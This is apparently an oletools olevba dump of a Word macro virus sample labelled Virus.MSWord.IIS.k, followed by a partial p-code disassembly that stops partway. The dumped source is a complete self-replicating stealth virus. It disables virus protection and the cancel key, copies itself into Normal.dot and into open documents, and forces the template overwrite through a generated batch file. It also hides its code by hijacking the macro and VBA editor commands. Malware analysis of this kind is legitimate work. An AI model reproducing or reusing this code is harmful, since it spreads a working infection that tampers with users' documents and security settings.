olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.IIS.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.IIS.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: ./Virus.MSWord.IIS.k - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'On Error GoTo eb
'MyName=SuperIISv1.3
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr NormalTemplate.FullName, vbNormal
NoSet:
Call Flitnic
eb:
End Sub
Sub ViewVbCode()
On Error GoTo NoDoc
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
'Clean Activedocument:
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.3" Then
Acd = 1
Exit For
End If
Next t
a = actdoche.VBComponents.Item(t).CodeModule.countoflines
actdoche.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
actdoche.VBComponents.Remove actdoche.VBComponents(t)
ActiveDocument.Saved = True
NoDoc:
'Clean NormalTemplate:
ms = nmtmpl.VBComponents.Count
For t2 = 2 To ms
ls = nmtmpl.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.3" Then
NormT = 1
Exit For
End If
Next t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = nmtmpl.VBComponents(t2).CodeModule.countoflines
nmtmpl.VBComponents(t2).CodeModule.deletelines 1, al
Next i
nmtmpl.VBComponents.Remove nmtmpl.VBComponents(t2)
NormalTemplate.Saved = True
esub:
eb:
Application.ShowVisualBasicEditor = True
NoDocL:
opttt.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
'Save ActiveDocument:
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.3" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = actdoche.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = actdoche.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
FullCodeD = FullCodeD & l & Chr(13)
Next ii
End If
'Clean Activedocument:
a = actdoche.VBComponents(t).CodeModule.countoflines
actdoche.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
'Save NormalTemplate:
ms = nmtmpl.VBComponents.Count
For t2 = 1 To ms
ls = nmtmpl.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.3" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = nmtmpl.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = nmtmpl.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
FullCodeN = FullCodeN & l & Chr(13)
Next iiii
End If
'Clean NormalTemplate:
l = ""
On Error GoTo 0
On Error GoTo eb
a = nmtmpl.VBComponents(t2).CodeModule.countoflines
nmtmpl.VBComponents(t2).CodeModule.deletelines 1, a
NormalTemplate.Saved = True
esub:
Close #1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir = Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
a = GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
If Application.ShowVisualBasicEditor = True Then ReInf = False
Reinfection:
If ReInf = True Then
'Reinfection:
Acd = 0
NormT = 0
If NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms = nmtmpl.VBComponents.Count
For inn = 2 To ms
a = nmtmpl.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
nmtmpl.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
nmtmpl.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
End If
i = 1
If NormAt <> True Then NormalTemplate.Save
notemp:
If Acd <> 1 Then
Close
look2:
a = Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms = actdoche.VBComponents.Count
For inn2 = 2 To ms
a = actdoche.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
actdoche.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
actdoche.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = nmtmpl.VBComponents(t2).CodeModule.countoflines
nmtmpl.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next i
End If
opttt.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub Flitnic()
Begin:
On Error GoTo eb
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
NormAt = False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
opttt.VirusProtection = False
opttt.ConfirmConversions = False
opttt.SaveNormalPrompt = False
Close #1
windir = Environ("windir")
On Error GoTo NoInf
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).CodeModule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.3" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
a = actdoche.VBComponents.Item(t).CodeModule.countoflines
For ii = 2 To a
l = actdoche.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
Next ii
End If
ms = nmtmpl.VBComponents.Count
For t2 = 1 To ms
ls = nmtmpl.VBComponents(t2).CodeModule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).CodeModule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.3" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
a = nmtmpl.VBComponents.Item(t2).CodeModule.countoflines
For iiii = 2 To a
l = nmtmpl.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
Next iiii
End If
If NormT <> 1 Then
look:
ms = nmtmpl.VBComponents.Count
For inn = 2 To ms
a = nmtmpl.VBComponents(inn).CodeModule.countoflines
If a < 1 Then
nmtmpl.VBComponents(inn).CodeModule.AddFromstring (FullCodeN)
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
nmtmpl.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt = ActiveDocument.ReadOnly
l = ""
On Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close
Close #1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
For i = 1 To 500
Print #1, "rem Flitnic has cought you... he, he"
Next i
Print #1, ":Begin"
Print #1, "Move /y " & Chr(34) & "c:\Troop.dat" & Chr(34) & " " & Chr(34) & NormalTemplate.FullName & Chr(34)
Print #1, "If exist c:\Troop.dat goto Begin"
Close #1
NormalTemplate.Saved = True
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
End If
notemp:
End If
i = 1
If Acd <> 1 Then
Close
look2:
ms = actdoche.VBComponents.Count
For inn2 = 2 To ms
a = actdoche.VBComponents(inn2).CodeModule.countoflines
If a < 1 Then
actdoche.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
actdoche.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
NoInf:
eb:
a = Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved = False
GoTo NoNormal
End If
If NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr (NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End If
NormalTemplate.Saved = True
'The only real- stealth virus till 08. april 1999. Infects Normal.Dot when
'it's ReadOnly too (immediatly, the first time you load an infected
'Document
'Written by Flitnic, member of [S o S] No Payload included yet!
NoNormal:
End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.IIS.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul1 - 18700 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0010 "On Error GoTo eb"
' Line #2:
' 	QuoteRem 0x0000 0x0013 "MyName=SuperIISv1.3"
' Line #3:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #4:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #5:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #6:
' 	Label NoSet 
' Line #7:
' 	ArgsCall (Call) Flitnic 0x0000 
' Line #8:
' 	Label eb 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Sub ViewVbCode())
' Line #11:
' 	OnError NoDoc 
' Line #12:
' 	SetStmt 
' 	Ld Options 
' 	Set opttt 
' Line #13:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set nmtmpl 
' Line #14:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set actdoche 
' Line #15:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #16:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #17:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #18:
' 	Label NoSet 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #20:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #21:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #23:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #25:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Loop 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #29:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #30:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #31:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #32:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #33:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #34:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #35:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.3"
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #37:
' 	ExitFor 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #42:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #43:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #44:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #45:
' 	Label NoDoc 
' Line #46:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #47:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #48:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #49:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #50:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #51:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.3"
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #53:
' 	ExitFor 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #57:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #59:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #63:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #64:
' 	Label esub 
' Line #65:
' 	Label eb 
' Line #66:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #67:
' 	Label NoDocL 
' Line #68:
' 	LitVarSpecial (False)
' 	Ld opttt 
' 	MemSt SaveNormalPrompt 
' Line #69:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub ToolsMacro())
' Line #72:
' 	OnError NoDoc 
' Line #73:
' 	SetStmt 
' 	Ld Options 
' 	Set opttt 
' Line #74:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set nmtmpl 
' Line #75:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set actdoche 
' Line #76:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #77:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoSet 
' 	EndIf 
' Line #78:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #79:
' 	Label NoSet 
' Line #80:
' 	QuoteRem 0x0000 0x0014 "Save ActiveDocument:"
' Line #81:
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #82:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #83:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #84:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #85:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.3"
' 	Eq 
' 	IfBlock 
' Line #86:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #87:
' 	ExitFor 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LitStr 0x000C "Sub AutoOpen"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #92:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #93:
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #94:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #95:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld actdoche 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #96:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #97:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #98:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	QuoteRem 0x0000 0x0015 "Clean Activedocument:"
' Line #101:
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #102:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld actdoche 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #103:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #104:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #105:
' 	Label NoDoc 
' Line #106:
' 	QuoteRem 0x0000 0x0014 "Save NormalTemplate:"
' Line #107:
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #108:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #109:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #110:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #111:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.3"
' 	Eq 
' 	IfBlock 
' Line #112:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #113:
' 	ExitFor 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #117:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #118:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #119:
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #120:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #121:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld nmtmpl 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #122:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #123:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #124:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #127:
' 	LitStr 0x0000 ""
' 	St l 
' Line #128:
' 	OnError (GoTo 0) 
' Line #129:
' 	OnError eb 
' Line #130:
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #131:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld nmtmpl 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #132:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #133:
' 	Label esub 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #135:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #136:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #137:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #138:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #139:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #140:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	Loop 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #144:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #145:
